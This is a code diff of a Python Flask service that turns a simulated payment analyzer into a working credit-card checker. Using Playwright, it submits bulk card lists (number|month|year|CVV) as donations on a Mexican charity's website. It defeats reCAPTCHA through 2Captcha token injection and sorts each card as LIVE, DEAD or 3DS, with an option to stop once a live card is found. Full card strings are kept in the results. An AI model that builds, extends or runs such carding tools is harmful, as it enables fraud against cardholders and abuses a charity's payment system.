@@ -1,26 +1,31 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, request, jsonify
 from flask_cors import CORS
-from dotenv import load_dotenv
 import os
-import json
 import re
 import threading
 import time
 from datetime import datetime
+from playwright.sync_api import sync_playwright
+import requests
+import logging
 
-# Cargar variables de entorno
-load_dotenv()
+# Configuración de logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-app = Flask(__name__, static_folder='static', template_folder='templates')
+app = Flask(__name__)
 CORS(app)
 
-# Configuración desde variables de entorno
-SECRET_KEY = os.getenv('SECRET_KEY', 'default-secret-key-change-me')
-MAX_WORKERS = int(os.getenv('MAX_WORKERS', '5'))
-API_TIMEOUT = int(os.getenv('API_TIMEOUT', '30'))
-LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
-
-app.config['SECRET_KEY'] = SECRET_KEY
+# Variables de entorno de Northflank
+HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
+API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
+EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
+EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
+EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
+EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
+EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
+DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
+MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))
 
 # Variables globales de estado
 checking_status = {
@@ -32,158 +37,539 @@ checking_status = {
     'error': 0,
     'current': '',
     'results': [],
-    'thread': None
+    'thread': None,
+    'stop_on_live': False
 }
 
 class PaymentAnalyzer:
-    """Analizador de respuestas de pagos"""
+    """Analizador de respuestas de pagos para Edupam"""
     
     @staticmethod
-    def analyze_response(response_data, raw_logs=""):
+    def analyze_payment_result(page_content, current_url, card_last4):
         """
-        Analiza la respuesta del gateway de pago
-        Retorna: {'status': 'live'|'decline'|'threeds'|'error', 'evidence': str, 'gate': str}
+        Analiza el resultado del pago basándose en múltiples métodos.
+        Retorna: {'status': 'live'|'decline'|'threeds'|'unknown', 'evidence': str}
         """
-        if not response_data:
-            return {'status': 'error', 'evidence': 'No response data', 'gate': 'unknown'}
-        
-        # Convertir todo a minúsculas para comparación
-        response_str = json.dumps(response_data).lower() if isinstance(response_data, dict) else str(response_data).lower()
-        logs_lower = raw_logs.lower()
-        
         evidence = []
-        gate = "unknown"
+        final_status = 'unknown'
         
-        # ========== DETECCIÓN DE GATE ==========
-        gate_patterns = {
-            'stripe': [r'stripe\.com', r'pi_[a-z0-9_]+', r'payment_intent'],
-            'square': [r'square\.com', r'sq0idp-[a-z0-9]+'],
-            'braintree': [r'braintreegateway\.com', r'braintree'],
-            'paypal': [r'paypal\.com', r'pp[a-z0-9]+'],
-            'authorize': [r'authorize\.net', r'aim\.auth']
+        # Convertir a minúsculas para búsqueda
+        page_content_lower = page_content.lower()
+        current_url_lower = current_url.lower()
+        
+        # ========== MÉTODO 1: Analizar URL actual ==========
+        url_patterns = {
+            'live': [r'success\.html', r'code=51', r'gracias'],
+            'decline': [r'error\.html', r'declined', r'rechazado'],
+            'threeds': [
+                r'authentication\.cardinalcommerce\.com',
+                r'threedsecure',
+                r'creq\?',
+                r'3d.*secure',
+                r'cardinalcommerce'
+            ]
         }
         
-        for gate_name, patterns in gate_patterns.items():
+        for status, patterns in url_patterns.items():
             for pattern in patterns:
-                if re.search(pattern, response_str + logs_lower, re.IGNORECASE):
-                    gate = gate_name
+                if re.search(pattern, current_url_lower, re.IGNORECASE):
+                    final_status = status
+                    evidence.append(f"URL pattern: {pattern}")
                     break
-            if gate != "unknown":
+            if final_status != 'unknown':
                 break
         
-        # ========== DETECCIÓN DE STATUS ==========
-        # 1. LIVE (Tarjeta válida)
-        live_patterns = [
-            r'status[\"\':\s]*1',                    # {status: 1}
-            r'\"status\"\s*:\s*1',                  # "status": 1
-            r'code=51',                            # code=51...
-            r'success\.html',                      # success.html
-            r'payment.*success',                   # payment success
-            r'transaction.*complete',              # transaction complete
-            r'approved',                           # approved
-            r'\"result\"\s*:\s*\"success\"',       # "result": "success"
-        ]
+        # ========== MÉTODO 2: Analizar contenido de la página ==========
+        content_patterns = {
+            'live': [
+                r'gracias.*donaci[oó]n',
+                r'donaci[oó]n.*exitosa',
+                r'transaction.*complete',
+                r'payment.*success',
+                r'aprobada',
+                r'confirmaci[oó]n',
+                r'[ée]xito',
+                r'completado'
+            ],
+            'decline': [
+                r'402\s*\(payment\s+required\)',
+                r'card.*declined',
+                r'insufficient.*funds',
+                r'rechazado',
+                r'declinado',
+                r'error',
+                r'fall[oó]',
+                r'intente.*nuevamente'
+            ],
+            'threeds': [
+                r'authentication\.cardinalcommerce\.com',
+                r'threedsecure',
+                r'creq\?',
+                r'3d.*secure',
+                r'cardinalcommerce',
+                r'autofocusing.*cross-origin.*subframe',
+                r'issuer.*authentication',
+                r'verificaci[oó]n.*adicional'
+            ]
+        }
         
-        # 2. DECLINE (Tarjeta rechazada)
-        decline_patterns = [
-            r'402\s*\(payment\s+required\)',       # 402 (Payment Required)
-            r'card.*declined',                     # card declined
-            r'insufficient.*funds',                # insufficient funds
-            r'do.not.honor',                       # do not honor
-            r'invalid.*account',                   # invalid account
-            r'stolen.*card',                       # stolen card
-            r'\"status\"\s*:\s*\"failed\"',        # "status": "failed"
-            r'payment.*failed',                    # payment failed
-        ]
-        
-        # 3. 3D SECURE (Requiere autenticación)
-        threeds_patterns = [
-            r'authentication\.cardinalcommerce\.com',
-            r'threedsecure',
-            r'creq\?',                             # CReq? (Cardinal Request)
-            r'3d.*secure',
-            r'cardinalcommerce',
-            r'autofocusing.*cross-origin.*subframe',
-            r'issuer.*authentication',
-            r'acs\.',                              # Access Control Server
-            r'redirect.*issuer',
-        ]
-        
-        # Buscar patrones
-        status = 'error'
-        matched_pattern = ''
-        
-        # Primero buscar 3DS (tiene prioridad)
-        for pattern in threeds_patterns:
-            if re.search(pattern, response_str + logs_lower, re.IGNORECASE):
-                status = 'threeds'
-                matched_pattern = pattern
-                evidence.append(f"3DS detected: {pattern}")
-                break
-        
-        # Si no es 3DS, buscar LIVE
-        if status == 'error':
-            for pattern in live_patterns:
-                if re.search(pattern, response_str + logs_lower, re.IGNORECASE):
-                    status = 'live'
-                    matched_pattern = pattern
-                    evidence.append(f"Live detected: {pattern}")
+        if final_status == 'unknown':
+            for status, patterns in content_patterns.items():
+                for pattern in patterns:
+                    if re.search(pattern, page_content_lower, re.IGNORECASE):
+                        final_status = status
+                        evidence.append(f"Content pattern: {pattern}")
+                        break
+                if final_status != 'unknown':
                     break
         
-        # Si no es LIVE, buscar DECLINE
-        if status == 'error':
-            for pattern in decline_patterns:
-                if re.search(pattern, response_str + logs_lower, re.IGNORECASE):
-                    status = 'decline'
-                    matched_pattern = pattern
-                    evidence.append(f"Decline detected: {pattern}")
-                    break
-        
-        # Si aún no se detectó, buscar códigos HTTP
-        if status == 'error':
-            http_codes = re.findall(r'\b(\d{3})\b', response_str + logs_lower)
+        # ========== MÉTODO 3: Buscar códigos HTTP ==========
+        if final_status == 'unknown':
+            http_codes = re.findall(r'\b(\d{3})\b', page_content_lower + current_url_lower)
             for code in http_codes:
                 if code == '200':
-                    status = 'live'
+                    final_status = 'live'
                     evidence.append(f"HTTP 200 OK")
                     break
                 elif code in ['402', '403', '500']:
-                    status = 'decline'
+                    final_status = 'decline'
                     evidence.append(f"HTTP {code} Error")
                     break
         
-        # Si sigue sin detectar, usar análisis heurístico
-        if status == 'error':
-            if 'error' in response_str or 'failed' in response_str:
-                status = 'decline'
-                evidence.append("Heuristic: error/failed keywords")
-            elif 'success' in response_str or 'complete' in response_str:
-                status = 'live'
-                evidence.append("Heuristic: success/complete keywords")
-        
         return {
-            'status': status,
-            'evidence': evidence[:3],  # Solo primeros 3 elementos
-            'gate': gate,
-            'matched_pattern': matched_pattern
+            'status': final_status,
+            'evidence': evidence[:3],
+            'url': current_url
         }
+
+class EdupamChecker:
+    def __init__(self, headless=True):
+        self.base_url = EDUPAM_BASE_URL
+        self.endpoint = EDUPAM_ENDPOINT
+        self.headless = headless
+        self.donor_data = {
+            'nombre': EDUPAM_DONOR_NAME,
+            'apellido': EDUPAM_DONOR_LASTNAME,
+            'email': EDUPAM_DONOR_EMAIL,
+            'fecha_nacimiento': '1990-01-01',
+            'tipo': 'one-time',
+            'codigo': ''
+        }
+        self.analyzer = PaymentAnalyzer()
+    
+    def parse_card_data(self, card_string):
+        """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
+        try:
+            parts = card_string.strip().split('|')
+            if len(parts) != 4:
+                raise ValueError("Formato inválido")
+            
+            return {
+                'numero': parts[0].strip().replace(' ', ''),
+                'mes': parts[1].strip().zfill(2),
+                'ano': parts[2].strip()[-2:],
+                'cvv': parts[3].strip()
+            }
+        except Exception as e:
+            logger.error(f"Error parseando tarjeta: {e}")
+            return None
+    
+    def fill_form(self, page, amount):
+        """Llenar formulario básico de donación"""
+        try:
+            # Nombre
+            page.fill('#name', self.donor_data['nombre'])
+            time.sleep(0.3)
+            
+            # Apellido
+            page.fill('#lastname', self.donor_data['apellido'])
+            time.sleep(0.3)
+            
+            # Email
+            page.fill('#email', self.donor_data['email'])
+            time.sleep(0.3)
+            
+            # Fecha de nacimiento
+            page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
+            time.sleep(0.3)
+            
+            # Monto
+            page.fill('#quantity', str(amount))
+            time.sleep(0.5)
+            
+            # Tipo de donativo (one-time por defecto)
+            page.locator('#do-type').click()
+            time.sleep(1)
+            
+            return True
+        except Exception as e:
+            logger.error(f"Error llenando formulario: {e}")
+            return False
+    
+    def fill_card_simple(self, page, card_info):
+        """Llenar datos de tarjeta usando método TAB"""
+        try:
+            # Hacer clic en el campo de monto para asegurar focus
+            page.locator('#quantity').click()
+            time.sleep(0.5)
+            
+            # Presionar TAB para ir al primer campo de tarjeta
+            page.keyboard.press('Tab')
+            time.sleep(1)
+            
+            # Escribir número de tarjeta
+            page.keyboard.press('Control+A')
+            page.keyboard.press('Backspace')
+            time.sleep(0.2)
+            
+            page.keyboard.type(card_info['numero'], delay=50)
+            time.sleep(1.5)
+            
+            # Esperar TAB automático y escribir fecha
+            fecha = card_info['mes'] + card_info['ano']
+            page.keyboard.type(fecha, delay=50)
+            time.sleep(1.5)
+            
+            # Esperar TAB automático y escribir CVC
+            page.keyboard.type(card_info['cvv'], delay=50)
+            time.sleep(1)
+            
+            return True
+        except Exception as e:
+            logger.error(f"Error llenando tarjeta: {e}")
+            return False
+    
+    def solve_captcha(self, page):
+        """Resolver captcha si existe"""
+        try:
+            # Buscar iframe de reCAPTCHA
+            recaptcha_frames = page.locator('iframe[src*="recaptcha"]')
+            if recaptcha_frames.count() == 0:
+                return True
+            
+            logger.warning("Captcha detectado")
+            
+            if not API_KEY_2CAPTCHA:
+                logger.warning("API de 2Captcha no configurada")
+                return True
+            
+            # Buscar site key
+            site_key_elem = page.locator('[data-sitekey]')
+            if site_key_elem.count() == 0:
+                return False
+            
+            site_key = site_key_elem.first.get_attribute('data-sitekey')
+            if not site_key:
+                return False
+            
+            logger.info(f"Resolviendo captcha con 2Captcha...")
+            
+            # Enviar a 2Captcha
+            url = "http://2captcha.com/in.php"
+            data = {
+                'key': API_KEY_2CAPTCHA,
+                'method': 'userrecaptcha',
+                'googlekey': site_key,
+                'pageurl': page.url,
+                'json': 1
+            }
+            
+            response = requests.post(url, data=data).json()
+            if response.get('status') != 1:
+                logger.error(f"Error 2Captcha: {response.get('request')}")
+                return False
+            
+            captcha_id = response.get('request')
+            
+            # Esperar solución
+            for _ in range(30):
+                time.sleep(5)
+                result = requests.get(
+                    "http://2captcha.com/res.php",
+                    params={'key': API_KEY_2CAPTCHA, 'action': 'get', 'id': captcha_id, 'json': 1}
+                ).json()
+                
+                if result.get('status') == 1:
+                    solution = result.get('request')
+                    
+                    # Inyectar solución
+                    page.evaluate(f"""
+                        document.getElementById('g-recaptcha-response').innerHTML = '{solution}';
+                        if (typeof ___grecaptcha_cfg !== 'undefined') {{
+                            Object.values(___grecaptcha_cfg.clients).forEach(client => {{
+                                if (client.l && client.l.callback) {{
+                                    client.l.l.callback('{solution}');
+                                }}
+                            }});
+                        }}
+                    """)
+                    
+                    logger.info("Captcha resuelto")
+                    time.sleep(2)
+                    return True
+                
+                elif result.get('request') != 'CAPCHA_NOT_READY':
+                    break
+            
+            return False
+            
+        except Exception as e:
+            logger.error(f"Error resolviendo captcha: {e}")
+            return False
+    
+    def check_single_card(self, card_string, amount=50):
+        """Verificar una sola tarjeta"""
+        logger.info(f"Verificando tarjeta: ****{card_string.split('|')[0][-4:]}")
+        
+        # Parsear tarjeta
+        card_info = self.parse_card_data(card_string)
+        if not card_info:
+            return {
+                'success': False,
+                'status': 'error',
+                'message': 'Error parseando tarjeta',
+                'card': card_string.split('|')[0][-4:] if '|' in card_string else '????'
+            }
+        
+        playwright = None
+        browser = None
+        
+        try:
+            # Iniciar Playwright
+            playwright = sync_playwright().start()
+            browser = playwright.chromium.launch(headless=self.headless)
+            context = browser.new_context(
+                viewport={'width': 1920, 'height': 1080},
+                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            )
+            
+            page = context.new_page()
+            
+            # Navegar a la página de donación
+            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
+            time.sleep(3)
+            
+            # Llenar formulario
+            if not self.fill_form(page, amount):
+                return {
+                    'success': False,
+                    'status': 'error',
+                    'message': 'Error llenando formulario',
+                    'card': card_info['numero'][-4:]
+                }
+            
+            # Ingresar tarjeta
+            if not self.fill_card_simple(page, card_info):
+                return {
+                    'success': False,
+                    'status': 'error',
+                    'message': 'Error ingresando tarjeta',
+                    'card': card_info['numero'][-4:]
+                }
+            
+            time.sleep(2)
+            
+            # Resolver captcha
+            if not self.solve_captcha(page):
+                return {
+                    'success': False,
+                    'status': 'error',
+                    'message': 'Error con captcha',
+                    'card': card_info['numero'][-4:]
+                }
+            
+            # Enviar donación
+            btn = page.locator('#btn-donation')
+            if btn.count() == 0:
+                return {
+                    'success': False,
+                    'status': 'error',
+                    'message': 'Botón no encontrado',
+                    'card': card_info['numero'][-4:]
+                }
+            
+            if btn.get_attribute('disabled'):
+                btn.click(force=True)
+            else:
+                btn.click()
+            
+            # Esperar respuesta
+            time.sleep(5)
+            
+            # Analizar resultado
+            current_url = page.url
+            page_content = page.content()
+            
+            analysis = self.analyzer.analyze_payment_result(
+                page_content, current_url, card_info['numero'][-4:]
+            )
+            
+            # Determinar estado final
+            status_map = {
+                'live': 'LIVE',
+                'decline': 'DEAD',
+                'threeds': '3DS',
+                'unknown': 'ERROR'
+            }
+            
+            final_status = status_map.get(analysis['status'], 'ERROR')
+            
+            # Mensaje según estado
+            messages = {
+                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
+                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
+                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
+                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
+            }
+            
+            return {
+                'success': True,
+                'status': final_status,
+                'original_status': messages.get(final_status, 'Estado desconocido'),
+                'message': ', '.join(analysis['evidence']) if analysis['evidence'] else 'Sin evidencia específica',
+                'response': {
+                    'url': analysis['url'],
+                    'evidence': analysis['evidence'],
+                    'timestamp': datetime.now().isoformat()
+                },
+                'card': f"****{card_info['numero'][-4:]}",
+                'gate': 'Edupam',
+                'amount': amount
+            }
+            
+        except Exception as e:
+            logger.error(f"Error verificando tarjeta: {e}")
+            return {
+                'success': False,
+                'status': 'ERROR',
+                'message': f'Error: {str(e)}',
+                'card': card_info['numero'][-4:] if 'card_info' in locals() else '????'
+            }
+        
+        finally:
+            try:
+                if browser:
+                    browser.close()
+                if playwright:
+                    playwright.stop()
+            except:
+                pass
+
+# ========== FUNCIONES DEL WORKER ==========
+
+def process_cards_worker(cards, amount, stop_on_live):
+    """Worker que procesa las tarjetas"""
+    global checking_status
+    
+    checker = EdupamChecker(headless=HEADLESS)
+    
+    for i, card_line in enumerate(cards):
+        if not checking_status['active']:
+            break
+        
+        try:
+            parts = card_line.strip().split('|')
+            if len(parts) < 4:
+                checking_status['error'] += 1
+                checking_status['results'].append({
+                    'id': i + 1,
+                    'card': 'INVALID',
+                    'status': 'ERROR',
+                    'message': 'Formato inválido',
+                    'timestamp': datetime.now().isoformat()
+                })
+                continue
+            
+            card_number = parts[0].strip()
+            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
+            checking_status['current'] = f"****{last4}"
+            
+            logger.info(f"Procesando tarjeta {i+1}/{len(cards)}: ****{last4}")
+            
+            # Verificar tarjeta
+            result = checker.check_single_card(card_line, amount)
+            
+            # Crear resultado
+            card_result = {
+                'id': i + 1,
+                'card': f"****{last4}",
+                'full_card': card_line,
+                'status': result.get('status', 'ERROR'),
+                'original_status': result.get('original_status', ''),
+                'message': result.get('message', ''),
+                'gate': result.get('gate', 'Edupam'),
+                'amount': amount,
+                'timestamp': datetime.now().isoformat(),
+                'response': result.get('response', {}),
+                'success': result.get('success', False)
+            }
+            
+            # Actualizar estadísticas
+            checking_status['processed'] += 1
+            checking_status['results'].append(card_result)
+            
+            if result.get('status') == 'LIVE':
+                checking_status['live'] += 1
+                if stop_on_live:
+                    checking_status['active'] = False
+                    break
+            elif result.get('status') == 'DEAD':
+                checking_status['decline'] += 1
+            elif result.get('status') == '3DS':
+                checking_status['threeds'] += 1
+            else:
+                checking_status['error'] += 1
+            
+            # Pequeño delay entre tarjetas
+            time.sleep(2)
+            
+        except Exception as e:
+            logger.error(f"Error procesando tarjeta: {e}")
+            checking_status['error'] += 1
+            checking_status['results'].append({
+                'id': i + 1,
+                'card': 'ERROR',
+                'status': 'ERROR',
+                'message': f'Error: {str(e)}',
+                'timestamp': datetime.now().isoformat()
+            })
+            continue
+    
+    checking_status['active'] = False
 
 # ========== ENDPOINTS API ==========
 
 @app.route('/')
 def index():
     """Endpoint raíz del backend"""
-    # Asegúrate que esta línea esté y tenga RETURN
     return jsonify({
         "status": "online",
-        "service": "Lattice Checker API",
+        "service": "Lattice Checker API (Edupam)",
         "version": "2.0",
         "endpoints": {
+            "health": "/api/health",
             "status": "/api/status",
+            "check_card": "/api/check-card (POST)",
             "check_cards": "/api/check (POST)",
             "results": "/api/results",
             "cancel": "/api/cancel (POST)"
+        },
+        "config": {
+            "headless": HEADLESS,
+            "donation_amount": DONATION_AMOUNT,
+            "max_workers": MAX_WORKERS,
+            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
         }
+    })
+
+@app.route('/api/health', methods=['GET'])
+def health_check():
+    """Verificar estado del servidor"""
+    return jsonify({
+        'status': 'online',
+        'service': 'Lattice Checker API',
+        'version': '2.0',
+        'timestamp': datetime.now().isoformat()
     })
 
 @app.route('/api/status', methods=['GET'])
@@ -200,9 +586,62 @@ def get_status():
         'total': len(checking_status['results'])
     })
 
+@app.route('/api/check-card', methods=['POST'])
+def check_single_card():
+    """Verificar una sola tarjeta (para el frontend)"""
+    global checking_status
+    
+    if checking_status['active']:
+        return jsonify({
+            'success': False,
+            'status': 'ERROR',
+            'message': 'Ya hay un chequeo en progreso'
+        }), 400
+    
+    data = request.json
+    
+    # Extraer datos
+    card_data = data.get('card', '')
+    cookies = data.get('cookies', '')  # Mantener para compatibilidad
+    
+    if not card_data or '|' not in card_data:
+        return jsonify({
+            'success': False,
+            'status': 'ERROR',
+            'message': 'Formato de tarjeta inválido',
+            'original_status': '⚠️ Error'
+        }), 400
+    
+    # Parsear tarjeta
+    parts = card_data.split('|')
+    if len(parts) < 4:
+        return jsonify({
+            'success': False,
+            'status': 'ERROR',
+            'message': 'Formato de tarjeta incompleto',
+            'original_status': '⚠️ Error'
+        }), 400
+    
+    card_number = parts[0].strip()
+    
+    # Validar formato básico
+    if not card_number.isdigit() or len(card_number) not in [15, 16]:
+        return jsonify({
+            'success': False,
+            'status': 'ERROR',
+            'message': 'Número de tarjeta inválido',
+            'original_status': '⚠️ Error'
+        }), 400
+    
+    # Verificar tarjeta
+    checker = EdupamChecker(headless=HEADLESS)
+    result = checker.check_single_card(card_data, DONATION_AMOUNT)
+    
+    return jsonify(result)
+
 @app.route('/api/check', methods=['POST'])
 def check_cards():
-    """Iniciar verificación de tarjetas"""
+    """Iniciar verificación de múltiples tarjetas"""
     global checking_status
     
     if checking_status['active']:
@@ -210,11 +649,20 @@ def check_cards():
     
     data = request.json
     cards = data.get('cards', [])
-    amount = data.get('amount', 50)
+    amount = data.get('amount', DONATION_AMOUNT)
     stop_on_live = data.get('stop_on_live', False)
     
     if not cards:
         return jsonify({'error': 'No hay tarjetas para verificar'}), 400
+    
+    # Filtrar tarjetas válidas
+    valid_cards = []
+    for card in cards:
+        if '|' in card and len(card.split('|')) >= 4:
+            valid_cards.append(card)
+    
+    if not valid_cards:
+        return jsonify({'error': 'No hay tarjetas válidas'}), 400
     
     # Inicializar estado
     checking_status = {
@@ -226,28 +674,31 @@ def check_cards():
         'error': 0,
         'current': '',
         'results': [],
-        'thread': None
+        'thread': None,
+        'stop_on_live': stop_on_live
     }
     
     # Iniciar thread de verificación
     thread = threading.Thread(
         target=process_cards_worker,
-        args=(cards, amount, stop_on_live)
+        args=(valid_cards, amount, stop_on_live)
     )
     thread.daemon = True
     thread.start()
     checking_status['thread'] = thread
     
     return jsonify({
-        'message': f'Verificación iniciada para {len(cards)} tarjetas',
-        'total': len(cards)
+        'success': True,
+        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
+        'total': len(valid_cards),
+        'amount': amount
     })
 
 @app.route('/api/results', methods=['GET'])
 def get_results():
     """Obtener resultados del chequeo"""
     return jsonify({
-        'results': checking_status['results'][-100:],  # Últimos 100 resultados
+        'results': checking_status['results'][-100:],
         'stats': {
             'total': len(checking_status['results']),
             'live': checking_status['live'],
@@ -262,147 +713,19 @@ def cancel_check():
     """Cancelar chequeo en curso"""
     global checking_status
     checking_status['active'] = False
-    return jsonify({'message': 'Chequeo cancelado'})
+    return jsonify({'success': True, 'message': 'Chequeo cancelado'})
 
-@app.route('/api/analyze', methods=['POST'])
-def analyze_response():
-    """Analizar una respuesta de pago específica"""
-    data = request.json
-    response_data = data.get('response', {})
-    logs = data.get('logs', '')
-    
-    analyzer = PaymentAnalyzer()
-    result = analyzer.analyze_response(response_data, logs)
-    
-    return jsonify(result)
-
-# ========== WORKER FUNCTIONS ==========
-
-def process_cards_worker(cards, amount, stop_on_live):
-    """Worker que procesa las tarjetas"""
-    global checking_status
-    
-    analyzer = PaymentAnalyzer()
-    
-    for i, card_line in enumerate(cards):
-        if not checking_status['active']:
-            break
-        
-        # Parsear tarjeta
-        try:
-            parts = card_line.strip().split('|')
-            if len(parts) < 4:
-                continue
-            
-            card_number = parts[0].strip()
-            month = parts[1].strip()
-            year = parts[2].strip()
-            cvv = parts[3].strip()
-            
-            last4 = card_number[-4:]
-            checking_status['current'] = f"****{last4}"
-            
-            # Simular verificación (EN PRODUCCIÓN AQUÍ IRÍA LA LÓGICA REAL DE PAGO)
-            time.sleep(1)  # Simular delay
-            
-            # Generar respuesta simulada basada en el tipo de tarjeta
-            result = simulate_payment_response(card_number, amount)
-            analysis = analyzer.analyze_response(result['response'], result['logs'])
-            
-            # Crear resultado
-            card_result = {
-                'id': i + 1,
-                'card': f"****{last4}",
-                'full_card': card_line,
-                'status': analysis['status'],
-                'gate': analysis['gate'],
-                'evidence': analysis['evidence'],
-                'amount': amount,
-                'timestamp': datetime.now().isoformat(),
-                'response': result['response'],
-                'logs': result['logs']
-            }
-            
-            # Actualizar estadísticas
-            checking_status['processed'] += 1
-            checking_status['results'].append(card_result)
-            
-            if analysis['status'] == 'live':
-                checking_status['live'] += 1
-                if stop_on_live:
-                    checking_status['active'] = False
-                    break
-            elif analysis['status'] == 'decline':
-                checking_status['decline'] += 1
-            elif analysis['status'] == 'threeds':
-                checking_status['threeds'] += 1
-            else:
-                checking_status['error'] += 1
-            
-            # Pequeño delay entre tarjetas
-            time.sleep(0.5)
-            
-        except Exception as e:
-            print(f"Error processing card: {e}")
-            continue
-    
-    checking_status['active'] = False
-
-def simulate_payment_response(card_number, amount):
-    """Simular diferentes respuestas de pago para testing"""
-    last_digit = int(card_number[-1])
-    
-    # Basado en el último dígito, generar diferentes respuestas
-    if last_digit % 3 == 0:  # LIVE (33%)
-        response = {
-            "status": 1,
-            "data": {
-                "id": f"tx_{int(time.time())}",
-                "amount": amount,
-                "currency": "MXN",
-                "status": "succeeded",
-                "payment_method": "card"
-            },
-            "message": "Payment successful"
-        }
-        logs = f"success.html?code=51...\n{{status: 1, data: {{...}}}}"
-    
-    elif last_digit % 3 == 1:  # DECLINE (33%)
-        response = {
-            "error": {
-                "code": "payment_intent_payment_failed",
-                "message": "Your card was declined.",
-                "type": "card_error",
-                "decline_code": "insufficient_funds"
-            },
-            "status": "failed"
-        }
-        logs = "POST https://api.stripe.com/v1/payment_intents/pi_XXXX/confirm 402 (Payment Required)"
-    
-    else:  # 3D SECURE (33%)
-        response = {
-            "status": "requires_action",
-            "next_action": {
-                "type": "redirect_to_url",
-                "redirect_to_url": {
-                    "url": f"https://authentication.cardinalcommerce.com/ThreeDSecure/V2_1_0/CReq?oid={int(time.time())}",
-                    "return_url": "https://your-site.com/return"
-                }
-            }
-        }
-        logs = "authentication.cardinalcommerce.com/ThreeDSecure/V2_1_0/CReq?... Blocked autofocusing on a <input> element in a cross-origin subframe"
-    
-    return {
-        'response': response,
-        'logs': logs
-    }
+# ========== INICIALIZACIÓN ==========
 
 if __name__ == '__main__':
-    port = int(os.getenv('PORT', 8080))
-    debug = os.getenv('FLASK_ENV', 'production') == 'development'
+    port = int(os.environ.get('PORT', 8080))
+    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
     
-    print(f"🚀 Server starting on port {port}")
-    print(f"🔧 Config: MAX_WORKERS={MAX_WORKERS}, API_TIMEOUT={API_TIMEOUT}")
-    print(f"📊 Log level: {LOG_LEVEL}")
+    logger.info(f"🚀 Server starting on port {port}")
+    logger.info(f"🔧 Config:")
+    logger.info(f"   Headless: {HEADLESS}")
+    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
+    logger.info(f"   Max workers: {MAX_WORKERS}")
+    logger.info(f"   2Captcha: {'enabled' if API_KEY_2CAPTCHA else 'disabled'}")
     
     app.run(host='0.0.0.0', port=port, debug=debug)
